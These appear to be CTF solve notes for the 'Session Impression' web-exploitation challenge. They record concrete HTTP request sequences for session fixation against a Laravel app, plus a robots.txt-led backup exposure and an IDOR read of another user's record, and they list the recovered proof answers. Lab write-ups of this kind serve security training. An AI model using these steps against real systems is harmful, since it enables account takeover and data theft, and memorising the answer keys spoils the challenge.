---
day: 8
slug: "session-impression"
lane: web-exploitation
modes: [single_solve, time_trial, mastery]
has_solve_py: [single_solve, mastery]
tags: []  # TODO: fill in descriptive kebab-case bug-class/technique tags, e.g. [reflected-xss, idor]
---

## single_solve

# Session Impression — single_solve NOTES

- Family: `web-exploitation-day-08-session-impression` (release day 21, curriculum day 8)
- Mode: single_solve (untimed, deadline null)
- Attempt: `0e5d4c32-8f2f-47a1-9f74-f89199b767d6`, started 2026-10-22T13:27:50Z
- Target 1: `https://9f194319c65f8d98f4ecc8e1806fcb1a2fd762e11b876fcf.2026.huntress.ctf.games/`
- Question: `proof-1` — "Recover the proof from Target 1." exact_text, normalization trim.

## Vulnerability: session fixation (fixed-session privilege transfer)

Prompt: "Plant your session on the welcome mat, then stroll in wearing
somebody else's credentials." The Laravel "Resume Room" app lets the client
choose its own session id via a `sid` query parameter on the feature route;
the app then issues that id back as the `arena_session` cookie, and the
protected secondary route trusts the session as an authenticated login.

## Evidence trail (all under evidence/target1*/)

1. `GET /` → 200 HTML, Laravel "Resume Room", links to `/api/clues`
   (`root.meta.json` / `root.body`). No session cookie set on the landing page.
2. `GET /api/clues` → 200 JSON
   (`clues.meta.json` / `clues.body`):
   ```json
   {"framework":"Laravel","feature_route":"/action-dadc74",
    "secondary_route":"/status-00d0e7","current_role":"analyst",
    "session_hint":"10328a42c20e"}
   ```
3. Baseline failures:
   - `GET /action-dadc74` → 400 `{"error":"session_id_required"}`
   - `GET /status-00d0e7` → 403 `{"error":"authenticated_login_required"}`
   - Carrier probes showed the parameter name is exactly `sid`
     (`param_sid.body` = `{"ok":true,"session_established":true}`); other
     names (`session`, `id`, `token`, headers, cookies, POST bodies) all keep
     returning `session_id_required`.
4. Plant ("welcome mat"): `GET /action-dadc74?sid=10328a42c20e` → 200
   `{"ok":true,"session_established":true}` with response header
   `Set-Cookie: arena_session=10328a42c20e; Path=/; httponly; samesite=lax`
   (session fixation: app adopts the client-supplied id).
5. Stroll ("somebody else's credentials"): `GET /status-00d0e7?sid=10328a42c20e`
   **carrying the `arena_session` cookie from step 4** → 200:
   ```json
   {"ok":true,"effect":"fixed_session_privilege_transfer",
    "evidence":"proof_079fbca1941841d188998b667a0da6d8"}
   ```
   (`status_sid.meta.json` / `status_sid.body`).
6. Without the cookie the stroll request still returns 403
   `authenticated_login_required` — verified in the first solve.py run
   (evidence preserved in the log; cookie jar fixed afterwards).

## Reusable solver

`solve.py` (stdlib only, scoped to the assigned origin, ~0.7 s pacing):

    python3 solve.py <target-url> [evidence-dir]

It fetches `/api/clues`, derives `feature_route`, `secondary_route` and
`session_hint` from the response (nothing hard-coded), plants the session with
`?sid=`, replays the `arena_session` cookie on the secondary route, and prints
`{"proof-1": "proof_..."}` on stdout. Verified end-to-end against the live
target on 2026-10-22 (evidence in `evidence/target1-solve-verify/`):
`{"proof-1": "proof_079fbca1941841d188998b667a0da6d8"}`.

Dependencies: Python 3.11+ stdlib only. Requires the live assigned target.

## Answer

- `proof-1` = `proof_079fbca1941841d188998b667a0da6d8`

## Round 2 re-verification (2026-10-22, round 002)

- Round 1 completed the exploit and recorded the proof, but no `answers.json`
  had been written before the round ended (rounds/002 prompt arrived with an
  unchanged assignment — same attempt id `0e5d4c32-...`, same target URL).
- Re-ran `python3 solve.py <target-url> evidence/target1-round2-verify`
  against the live target: target still active, same clues/routes, same proof
  returned: `{"proof-1": "proof_079fbca1941841d188998b667a0da6d8"}`.
  Evidence in `evidence/target1-round2-verify/` (root, clues, plant, stroll,
  cookies.txt).
- Wrote `answers.json` with exactly the assigned answer_id:
  `{"answers": {"proof-1": "proof_079fbca1941841d188998b667a0da6d8"}}`.
- Grading feedback from the coordinator: null (no prior submission on record).

## Limits

- The proof is per-attempt; a fresh attempt/target will mint different route
  suffixes, hints and proofs — re-run `solve.py` against the new target URL.
- No 5xx responses observed; all requests kept to a small, paced set.

## time_trial

# Session Impression — time_trial NOTES

- Family: `web-exploitation-day-08-session-impression` (release day 21, curriculum day 8)
- Mode: time_trial — **untimed** variant: `run_for_time: false`,
  `hall_of_fame_eligible: false`, `deadline: null`. Regular scored attempt,
  `variant_fresh: true`.
- Attempt: `32163a71-e664-47c2-9b88-dc40f9b71006`, started 2026-10-22T13:35:34Z
- Target 1: `https://5ae19c7dccf87700fe4bad0dd7a129d913ae0336b0470f21.2026.huntress.ctf.games/`
- Question: `proof-1` — "Recover the proof from Target 1." exact_text, trim.
- Grading feedback at round start: null.

## Method (reused from family single_solve)

Same vulnerability as the single_solve mode: session fixation in the Laravel
app. The family's reusable `solve.py` was copied from
`../single_solve/solve.py` unmodified (it derives everything from the live
target — no per-attempt values hard-coded) and run once:

    python3 solve.py <target-url> evidence/target1

## Evidence trail (evidence/target1/)

1. `GET /` → 200 Laravel landing page (`root.meta.json` / `root.body`).
2. `GET /api/clues` → 200 (`clues.body`):
   ```json
   {"framework":"Laravel","feature_route":"/dispatch-fd7fde",
    "secondary_route":"/internal-ad1743","current_role":"analyst",
    "session_hint":"40876684aba3"}
   ```
3. Plant: `GET /dispatch-fd7fde?sid=40876684aba3` → 200
   `{"ok":true,"session_established":true}`; the app adopted the
   client-supplied session id as `arena_session` (cookie recorded in
   `cookies.txt`).
4. Stroll: `GET /internal-ad1743?sid=40876684aba3` carrying the planted
   `arena_session` cookie → 200 (`stroll.body`):
   ```json
   {"ok":true,"effect":"fixed_session_privilege_transfer",
    "evidence":"proof_c3163e220c0f4038aa783429ed06104d"}
   ```

All values (route suffixes, session hint, proof) are per-attempt and were
derived from this attempt's live responses on 2026-10-22. Requests paced
~0.7 s apart; four requests total; no 5xx observed.

## Reusable solver

`solve.py` (stdlib only, scoped to the assigned origin):

    python3 solve.py <target-url> [evidence-dir]

prints `{"proof-1": "proof_..."}` on stdout. Dependencies: Python 3.11+
stdlib, live assigned target.

## Answer

- `proof-1` = `proof_c3163e220c0f4038aa783429ed06104d`

## Limits

- Proof is per-attempt; a retry/fresh variant mints new routes, hint and
  proof — re-run `solve.py` against the new target URL.
- Single solver run, no retries needed.

## mastery

# Session Impression — mastery NOTES

- Family: `web-exploitation-day-08-session-impression` (release day 21, curriculum day 8)
- Mode: mastery — **untimed** variant: `run_for_time: false`,
  `hall_of_fame_eligible: false`, `deadline: null`. `variant_fresh: true`.
- Attempt: `0a4c7aa7-b3bc-46e4-b413-78435fdda3ac`, started 2026-10-22T13:36:49Z
- Grading feedback at round start: null.
- Three targets, three questions joined by `questions[].artifact` → `targets[].id`:
  - `proof-1` ← Target 1 `https://5a22beefb249e11cd2599c1b6861aaec69092cb68fe25636.2026.huntress.ctf.games/`
  - `proof-2` ← Target 2 `https://3d12a2e018a8bb5a8277ffd91ad5b3d8ec862427e766b92c.2026.huntress.ctf.games/`
  - `proof-3` ← Target 3 `https://bc4797867d9e908c7084e966fe139e197a4cfe740e967130.2026.huntress.ctf.games/`

## Mastery mixes families — per-target classification

As the shared lessons brief warns, mastery did **not** repeat only the named
session-fixation bug. Each target was classified from its own root page
(evidence/targetN/root.body):

| Target | App | Evidence | Class |
|---|---|---|---|
| 1 | "Tiny Uptime" (Node.js) | HTML comment "remember to review crawler policy before launch" | Backup exposure |
| 2 | "Incident Picnic" | signed-in dashboard, `/incidents/<id>` case links, `/api/events` feed | IDOR |
| 3 | "Cookie Desk" (Laravel) | `/api/clues` route inventory with session_hint | Session fixation (family bug) |

## Target 1 — backup exposure → proof-1

Evidence dir `evidence/target1/`:

1. `GET /` → 200; HTML comment: `<!-- deployment note: remember to review
   crawler policy before launch -->`.
2. `GET /robots.txt` → 200: `User-agent: * / Disallow: /deploy-86265/`
   (directory derived from response, no wordlist).
3. `GET /deploy-86265/` → 200 open index listing
   `environment-copy-d5d3f5.json.bak` and `release-notes.txt`.
4. `GET /deploy-86265/environment-copy-d5d3f5.json.bak` → 200:
   ```json
   {"environment": "production",
    "support_note": "proof_c481f3e9110444faaa1e05c2cfd7246d"}
   ```

- `proof-1` = `proof_c481f3e9110444faaa1e05c2cfd7246d`

## Target 2 — IDOR → proof-2

Evidence dir `evidence/target2/`:

1. `GET /` → 200 dashboard "Signed in as Jules"; case links
   `/incidents/2924`, `/incidents/5325`, `/incidents/1501` (my ids) and feed
   link `/api/events`. Session cookie set by this request (jar kept in-process).
2. `GET /incidents/2924` → inline `fetch("/api/incidents/2924")` reveals the
   object-API template `/api/incidents/<id>`.
3. `GET /api/events` →
   ```json
   {"current_user":"Jules","events":[
     {"case_id":2924,"owner":"Jules",...,"visibility":"workspace"},
     {"case_id":13846,"owner":"executive","action":"Case reassigned outside
       your workspace","visibility":"reference_only"},
     {"case_id":5325,"owner":"Jules",...,"visibility":"workspace"}]}
   ```
   Foreign case id `13846` (owner executive, reference_only) derived from the
   feed — no enumeration.
4. `GET /api/incidents/13846` (same cookie jar) → 200, no ownership check:
   ```json
   {"id":13846,"owner":"executive","title":"Executive escalation",
    "status":"restricted","note":"proof_45369c38988e4e488194032d9f15cdf0"}
   ```

- `proof-2` = `proof_45369c38988e4e488194032d9f15cdf0`

## Target 3 — session fixation → proof-3

Evidence dir `evidence/target3/` (family solver `solve.py`, copied from the
family's earlier modes, derives everything from live responses):

1. `GET /api/clues` →
   ```json
   {"framework":"Laravel","feature_route":"/execute-f8a0ff",
    "secondary_route":"/status-744fd3","current_role":"analyst",
    "session_hint":"88ca261cddf6"}
   ```
2. Plant: `GET /execute-f8a0ff?sid=88ca261cddf6` →
   `{"ok":true,"session_established":true}`; app adopts the client-chosen id
   as `arena_session` (see `cookies.txt`).
3. Stroll: `GET /status-744fd3?sid=88ca261cddf6` carrying the planted cookie →
   ```json
   {"ok":true,"effect":"fixed_session_privilege_transfer",
    "evidence":"proof_21c5d60988494418b3446f8f334af689"}
   ```

- `proof-3` = `proof_21c5d60988494418b3446f8f334af689`

## Reusable solvers

- `solve.py` — single-target session-fixation solver (family bug):
  `python3 solve.py <target-url> [evidence-dir]` → `{"proof-1": "proof_..."}`.
- `solve_mastery.py` — multi-family mastery dispatcher:
  `python3 solve_mastery.py targets.json [evidence-dir]` →
  `{"Target 1": "proof_...", ...}` keyed by target id. It classifies each
  target from live evidence (clues API → session fixation; crawler hint /
  robots.txt → backup exposure; feed + case links → IDOR) and ports the
  recovery logic from the shared day-19/20 references (methods only — no
  legacy GM workflow, no saved proofs/paths).

Dependencies: Python 3.11+ stdlib only; requires the live assigned targets.

## Answers

```json
{"proof-1": "proof_c481f3e9110444faaa1e05c2cfd7246d",
 "proof-2": "proof_45369c38988e4e488194032d9f15cdf0",
 "proof-3": "proof_21c5d60988494418b3446f8f334af689"}
```

All three values were recovered from this attempt's live target responses on
2026-10-22; they are per-attempt and distinct from the single_solve and
time_trial proofs. Requests paced ~0.7 s apart, one at a time; ~14 requests
total across three origins; no 5xx observed.

## Limits

- Proofs, route suffixes, disallowed dirs, backup names and foreign object
  ids are per-attempt; a fresh variant must be re-derived with the solvers
  above (nothing is hard-coded).
- Target 2's IDOR read relies on the feed disclosing a foreign id; if a
  future variant's feed lists none, the solver reports the gap instead of
  enumerating ids.
